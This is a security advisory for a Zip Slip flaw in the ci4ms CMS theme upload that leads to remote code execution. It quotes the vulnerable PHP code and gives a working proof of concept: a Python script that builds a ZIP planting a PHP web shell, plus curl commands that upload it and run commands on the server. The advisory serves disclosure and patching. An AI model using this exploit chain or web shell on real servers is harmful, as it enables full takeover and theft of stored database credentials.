# [C] CI4MS Theme::upload is vulnerable to Zip Slip leading to RCE

## Summary
Severity: Critical
Advisory: GHSA-xv3r-vr59-95rg
CVE: CVE-2026-41203
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-xv3r-vr59-95rg
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.5.0

## Details
### Summary
ci4ms Theme::upload extracts user uploaded ZIP archives without validating entry names, allowing an authenticated backend user with the theme create permission to write files to arbitrary filesystem locations (Zip Slip) and achieve remote code execution by dropping a PHP file under the public web root.

### Details
modules/Theme/Controllers/Theme.php:13-56 implements the theme upload action. ZipArchive::extractTo() is called directly with no iteration over entry names to verify they resolve inside the destination:

```php
public function upload()
{
    $valData = ([
        'theme' => ['label' => lang('Theme.backendTheme'), 'rules' => 'uploaded[theme]|ext_in[theme,zip]|mime_in[theme,...]'],
    ]);
    if ($this->validate($valData) == false) return redirect()->route('backendThemes')->withInput()->with('errors', $this->validator->getErrors());
    $file = $this->request->getFile('theme');
    $tempPath = WRITEPATH . 'tmp/' . str_replace('_theme.zip', '', $file->getName()) . '/';
    $zip = new \ZipArchive();
    if ($zip->open($file->getTempName()) === true) {
        $zip->extractTo($tempPath);     // no entry-name validation
        $zip->close();
    } ...
    $log = install_theme_from_tmp($themeName);
    ...
}
```

A ZIP containing entries like `../../public/shell.php` is extracted outside `writable/tmp/` into directories served by PHP. The author validates entries correctly in modules/Methods/Controllers/Methods.php:165-175 with a realpath + regex loop; the same check is missing here.

Routing: modules/Theme/Config/Routes.php binds `POST backend/themes/themesUpload` to Theme::upload with `role=create`. Although ThemeConfig itself does not list the route in csrfExcept, the upload handler is still reachable cross-site by any admin browser that has `create` on the Theme module, and any admin with that role can trigger it directly.

A companion Zip Slip bug in Backup::restore is tracked separately as GHSA-xp9f-pvvc-57p4.

### PoC
Build the archive:

```python
python3 -c "
import zipfile
with zipfile.ZipFile('evil_theme.zip','w') as z:
    z.writestr('../../public/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
    z.writestr('info.xml', '<theme name=\"x\"/>')
"
```

Upload through the Theme manager with an authenticated session that has theme create:

```bash
curl -i -b 'ci4ms_session=<SESSION_ID>' \
  -F 'theme=@evil_theme.zip' \
  https://target.example.com/backend/themes/themesUpload
```

Trigger the shell:

```bash
curl 'https://target.example.com/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Impact
Any ci4ms account that can upload a theme can write arbitrary files under the application root and gain remote code execution on the server, fully compromising the installation, the database credentials stored in .env, and any content the site handles.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-xv3r-vr59-95rg
- https://nvd.nist.gov/vuln/detail/CVE-2026-41203
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.5.0
